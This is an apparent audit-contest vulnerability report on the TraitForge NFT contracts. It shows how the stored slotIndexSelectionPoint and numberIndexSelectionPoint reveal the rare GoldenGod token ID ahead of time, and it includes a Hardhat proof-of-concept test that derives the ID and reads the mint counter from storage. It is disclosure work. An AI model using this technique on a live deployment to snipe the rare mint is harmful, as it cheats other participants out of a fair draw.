# Vulnerability details

## Impact

According to the protocol design, obtaining the `GoldenGod` entity gives the user a considerable advantage. Although this entity is “randomly” generated, it is stored in the contract storage. This allows the ID of the `GoldenGod` to be determined in advance once the entropies are generated. A malicious user, armed with this ID, can monitor the IDs of newly created entities and wait until they approach the `GoldenGod`, then strategically mint it. As a result, apart from defeating the game’s purpose of being fair and random, this system flaw can have a detrimental effect on other users' motivation to participate thus killing the protocol’s user engagement.

Here is the function in question:

```solidity
// EntropyGenerator.sol

// ---

uint256 public slotIndexSelectionPoint;
uint256 public numberIndexSelectionPoint;
  
// ---  

//select index points for 999999, triggered each gen-increment
function initializeAlphaIndices() public whenNotPaused onlyOwner {
  uint256 hashValue = uint256(
    keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
  );

  uint256 slotIndexSelection = (hashValue % 258) + 512;
  uint256 numberIndexSelection = hashValue % 13;

  slotIndexSelectionPoint = slotIndexSelection;
  numberIndexSelectionPoint = numberIndexSelection;
}
```

As we can see from above, the `slotIndexSelectionPoint` and `numberIndexSelectionPoint` are calculated and stored in the contract storage. Knowing them, it is possible to work out the the ID of the `GoldenGod`. 

## Proof of concept

The test file provided below shows how to obtain the ID of the `GoldenGod` having the storage variables mentioned above. 

In the first test, we mint the entire generation 1. Then, obtain the ID of the `GoldenGod` and verify that it is correct. In the second test, we obtain the ID of the last entity, which will help the malicious user monitor the progress of minted entities and ambush the minting of `GoldenGod`.  

```js
// ContestGoldenGod.test.ts

import { parseEther } from 'ethers';
import {
    Airdrop,
    DevFund,
    EntityForging,
    EntropyGenerator,
    EntityTrading,
    NukeFund,
    TraitForgeNft,
} from '../typechain-types';
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import generateMerkleTree from '../scripts/genMerkleTreeLib';
import { entropyGenerator } from '../typechain-types/contracts';

const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('GoldenGod', () => {
    let entityForging: EntityForging;
    let nft: TraitForgeNft;
    let owner: HardhatEthersSigner;
    let user1: HardhatEthersSigner;
    let user2: HardhatEthersSigner;
    let entityTrading: EntityTrading;
    let nukeFund: NukeFund;
    let devFund: DevFund;
    let FORGER_TOKEN_ID: number;
    let MERGER_TOKEN_ID: number;
    let merkleInfo: any;
    let entropyGenerator: any;

    before(async () => {
        [owner, user1, user2] = await ethers.getSigners();

        // Deploy TraitForgeNft contract
        const TraitForgeNft = await ethers.getContractFactory('TraitForgeNft');
        nft = (await TraitForgeNft.deploy()) as TraitForgeNft;

        // Deploy Airdrop contract
        const airdropFactory = await ethers.getContractFactory('Airdrop');
        const airdrop = (await airdropFactory.deploy()) as Airdrop;

        await nft.setAirdropContract(await airdrop.getAddress());

        await airdrop.transferOwnership(await nft.getAddress());

        // Deploy EntropyGenerator contract
        const EntropyGenerator = await ethers.getContractFactory(
            'EntropyGenerator'
        );
        entropyGenerator = (await EntropyGenerator.deploy(
            await nft.getAddress()
        )) as EntropyGenerator;

        await entropyGenerator.writeEntropyBatch1();
        await entropyGenerator.writeEntropyBatch2();
        await entropyGenerator.writeEntropyBatch3();

        await nft.setEntropyGenerator(await entropyGenerator.getAddress());

        // Deploy EntityForging contract
        const EntityForging = await ethers.getContractFactory('EntityForging');
        entityForging = (await EntityForging.deploy(
            await nft.getAddress()
        )) as EntityForging;
        await nft.setEntityForgingContract(await entityForging.getAddress());

        devFund = await ethers.deployContract('DevFund');
        await devFund.waitForDeployment();

        const NukeFund = await ethers.getContractFactory('NukeFund');

        nukeFund = (await NukeFund.deploy(
            await nft.getAddress(),
            await airdrop.getAddress(),
            await devFund.getAddress(),
            owner.address
        )) as NukeFund;
        await nukeFund.waitForDeployment();

        await nft.setNukeFundContract(await nukeFund.getAddress());

        entityTrading = await ethers.deployContract('EntityTrading', [
            await nft.getAddress(),
        ]);

        // Set NukeFund address
        await entityTrading.setNukeFundAddress(await nukeFund.getAddress());

        merkleInfo = generateMerkleTree([
            owner.address,
            user1.address,
            user2.address,
        ]);

        await nft.setRootHash(merkleInfo.rootHash);

        // Mint some tokens for testing
        await nft.connect(owner).mintToken(merkleInfo.whitelist[0].proof, {
            value: ethers.parseEther('1'),
        });
        await nft.connect(user1).mintToken(merkleInfo.whitelist[1].proof, {
            value: ethers.parseEther('1'),
        });
        await nft.connect(user1).mintToken(merkleInfo.whitelist[1].proof, {
            value: ethers.parseEther('1'),
        });

        for (let i = 0; i < 10; i++) {
            await nft.connect(owner).mintToken(merkleInfo.whitelist[0].proof, {
                value: ethers.parseEther('1'),
            });
            const isForger = await nft.isForger(i + 4);
            if (isForger) {
                FORGER_TOKEN_ID = i + 4;
                break;
            }
        }

        expect(await nft.connect(user1).generationMintCounts(1)).to.equal(
            FORGER_TOKEN_ID
        );
    });

    describe('GoldenGod', () => {
        it('obtains the GoldenGod Token ID', async () => {
            console.log("---------- START OF MINTING ----------");
            // mint the entire generation 1
            for (let i = FORGER_TOKEN_ID + 1; i < 10001; ++i) {
                await nft.connect(user1).mintToken(merkleInfo.whitelist[1].proof, {
                    value: ethers.parseEther('1'),
                });
                // providing visual feedback inside console
                console.log("Minting token with ID >>> ", i);
            }
            console.log("---------- END OF MINTING ----------");

            // get the coordinates of the GoldenGod
            const slotIndex: bigint = await entropyGenerator.slotIndexSelectionPoint();
            const numberIndex: bigint = await entropyGenerator.numberIndexSelectionPoint();
            console.log('slotIndexSelectionPoint >>> ', slotIndex);
            console.log('numberIndexSelectionPoint >>> ', numberIndex);

            // ensure that the above coordinates yield the golden entropy
            const goldenEntropy: bigint = await entropyGenerator.getPublicEntropy(slotIndex, numberIndex);
            console.log('GoldenGod entropy >>> ', goldenEntropy);
            expect(goldenEntropy).to.equal(999999n);

            // calculate the entity ID by the GoldenGod's slot and number index
            const calculatedGoldenGodId: bigint = getTokenIdBySlotAndNumberIndex(slotIndex, numberIndex);
            console.log("getTokenIdBySlotAndNumberIndex >>>", calculatedGoldenGodId);

            // retrieve the entropy of the calculatedGoldenGodId and ensure it matches the golden entropy
            const entropyOfCalculatedId: bigint = await nft.tokenEntropy(calculatedGoldenGodId);
            console.log("entropyOfCalculatedId >>> ", entropyOfCalculatedId);
            expect(goldenEntropy).to.equal(entropyOfCalculatedId);
        });

        it('determines the ID of the last entity', async () => {
            // Examine the TradeForgeNft contract storage layout
            console.log("---------- START OF STORAGE LAYOUT ----------");
            for (let i: number = 0; i < 40; ++i) {
                const value = await ethers.provider.getStorage(nft.getAddress(), i);
                console.log("slot", i, " >>> ", BigInt(value));
            }
            console.log("---------- END OF STORAGE LAYOUT ----------");
            // by examining the storage layout, and experimenting
            // with different numbers of minted tokens,
            // we determine that the ID of the last entity is stored in slot 30
            const lastIndex: bigint = await ethers.provider.getStorage(nft.getAddress(), 30);
            expect(lastIndex).to.equal(10000n);
        });
    });
});

function getTokenIdBySlotAndNumberIndex(slotIndex: bigint, numberIndex: bigint) {
    return slotIndex * 13n + numberIndex + 1n;
}
```

To run the test, inside the `test` directory create a new file named `ContestGoldenGod.test.ts`, copy the above code and paste it in the file. Then, invoke the following console command:

```bash
yarn test ./test/ContestGoldenGod.test.ts 
```
